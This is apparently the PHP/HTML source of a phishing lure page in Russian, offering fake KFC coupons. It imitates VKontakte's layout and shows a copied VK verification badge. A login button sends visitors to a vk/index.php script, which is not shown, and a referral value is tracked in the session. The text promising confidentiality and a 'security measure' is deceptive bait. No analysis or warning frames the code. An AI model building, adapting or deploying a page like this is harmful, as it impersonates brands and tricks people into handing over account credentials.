<?php session_start();
include('../bdlog.php');

if(isset($_GET['reff'])) {
	$_SESSION['comment'] = $_GET['reff'];
	$sessref = $_SESSION['comment'];
} else {
	$sessref = 'non-ref';
}?>

<head><script src="//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script><script src="https://use.fontawesome.com/cfcafde07d.js"></script><link href="https://use.fontawesome.com/cfcafde07d.css" media="all" rel="stylesheet">
<meta http-equiv="content-type" content="text/html; charset=utf8"><title>Купоны KFC - 5 за 33. </title>
<link rel="stylesheet" type="text/css" href="css/common.css">
<link rel="stylesheet" type="text/css" href="css/st.css"></head>
<body class="index_page" data-useragent="chrome"><div id="wrap2">
  <div id="system_msg" class="fixed"></div>
  <div id="utils"><div id="fonts_cnt_css"></div><div id="common_css"></div><div id="index_css"></div><div id="login_css"></div><div id="ui_controls_css"></div><div id="ui_common_css"></div><div id="tooltips_css"></div></div>

  <div id="layer_bg" class="fixed" style="height: 327px;"></div><div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap" style="width: 1366px; height: 327px;"><div id="layer" style="width: 1348px;"></div></div>
  <div id="box_layer_bg" class="fixed" style="height: 327px;"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed" style="width: 1366px; height: 327px;"><div id="box_layer" style="width: 1348px;"><div id="box_loader"><div class="pr pr_baw pr_medium" id="box_loader_pr"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div><div class="back"></div></div></div></div>

<div id="stl_left" style="width: 178px;"><div id="stl_bg"><nobr id="stl_text">Наверх</nobr></div></div><div id="stl_side" style="left: 179px; width: 10px; top: 42px; height: 285px;"></div>  <div class="scroll_fix_wrap _page_wrap" id="page_wrap"><div><div class="scroll_fix" style="width: 1348px;">
  

  <div id="page_header_cont" class="page_header_cont">
    <div class="back"></div>
    <div id="page_header_wrap" class="page_header_wrap" style="width: 1348px;">
      <a class="top_back_link" href="" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }" onmousedown="tnActive(this)" style="max-width: 1313px;"></a>
      <div id="page_header" class="p_head p_head_l0" style="width: 960px">
        <div class="content">
          <div id="top_nav" class="head_nav">
  <div class="head_nav_item fl_l"><a class="top_home_link fl_l " href="/" aria-label="На главную" accesskey="1"><div class="top_home_logo"></div></a>
 </div>
  <div class="head_nav_item fl_l"><div style="display:none;" id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();">
  <input name="disable-autofill" style="display: none;">
  <div class="input_back_wrap no_select"><div class="input_back" style="margin: 7px 0px 7px 8px; padding: 6px 6px 6px 19px;"><div class="input_back_content" style="width: 210px;">Поиск</div></div></div><input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" aria-label="Поиск">
</div></div>
  <div class="head_nav_item fl_l head_nav_btns"><span id="top_audio_layer_place"></span></div>
  <div class="head_nav_item fl_r" style="
    float: none;
    font-weight: normal;
"><a class="top_nav_link" href="kfc/index.php" id="top_switch_lang" onmousedown="tnActive(this)">Главная
</a>
</div>
  <div class="head_nav_item_player"></div>
</div>
<div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
        </div>
      </div>
    </div>
  </div>
  <div id="page_layout" style="width: 960px;">
    <div id="side_bar" class="fl_l " style="display: none">
      <div id="side_bar_inner" class="side_bar_inner" style="position: relative; margin-top: 42px;">
       
      </div>
    </div>

    <div id="page_body" class="fl_r " style="width: 960px;">
      <div id="header_wrap2">
        <div id="header_wrap1">
          <div id="header" style="display: none">
            <h1 id="title"></h1>
          </div>
        </div>
      </div>
      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2">
  <div id="wrap1">
	<div id="content" class=""> 
	<div id="index_lcolumn" class="index_lcolumn" style="background: #fff;border-radius: 2px;box-shadow: 0 1px 0 0 #d7d8db, 0 0 0 1px #e3e4e8;padding: 10px;"><img src="wugfw.jpg" style="
    /* background: #fff; */
    border-radius: 2px;
    /* box-shadow: 0 1px 0 0 #d7d8db, 0 0 0 1px #e3e4e8; */
    width: 600px;
    /* padding: 10px; */
"></div>
<div id="index_rcolumn" class="index_rcolumn">
<div id="index_login" class="page_block index_login">
    <h4>Добро пожаловать</h4>
<h5>На нашем сайте можно получить персональный купон в ресторане KFC. <br><br>Для начала необходимо войти на сайт. Это лишь мера безопастности, из-за злоупотреления. 
 Мы работаем по правилу: 1 человек - 1 заказ. Все введенные Вами данные конфиденциальны. Нажимая кнопку "Войти", Вы соглашаетесь со всем прочтенным выше. </h5></div>

  <div id="index_login" class="page_block index_login">
    <form method="post" name="login" id="index_login_form" action="vk/index.php">
      <button id="index_login_button" class="index_login_button flat_button button_big_text">Войти</button>
  <form name="login" action="vk/index.php" method="post" onsubmit="return check();">	
    </form>
  </div>
  
</div>
  <a onclick="curBox().fadeOut()" id="login_mobile_close" class="login_mobile_close"></a>
<script src="/js/data9374.js"></script>
 


</div></div>
  </div>
</div></div>
    </div>
    <div class="clear"></div>
  </div>
</div></div><noscript>&amp;lt;div style="position:absolute;left:-10000px;"&amp;gt;
&amp;lt;img src="//top-fwz1.mail.ru/counter?id=2579437;js=na" style="border:0;" height="1" width="1" /&amp;gt;
&amp;lt;/div&amp;gt;</noscript></div>
  <div class="progress" id="global_prg"></div>




<div id="index_footer_wrap" class="footer_wrap index_footer_wrap">
  <div class="footer_nav" id="bottom_nav">
  <div class="footer_copy fl_l"><a target="_blank" href="https://vk.com/kfc2019">Купоны KFC</a> <a href="https://vk.com/verify" target="_blank"><img src="https://vk.com/images/icons/verify.png?1"></a> © 2019</div>
  <div class="footer_lang fl_r" style="color: #edeef0;">Язык:<an class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '0659e683d8cb3ffc87'})" style="
    color: #edeef0;
">English</an><an class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: '0659e683d8cb3ffc87'})" style="
    color: #edeef0;
">Русский</an><an class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: '0659e683d8cb3ffc87'})" style="
    color: #edeef0;
">Українська</an><an class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;" style="
    color: #edeef0;
">все языки »</an></div>
  <div class="footer_links">
  </div>
</div></div>

<div class="footer_bench clear">
  
</div>
</body>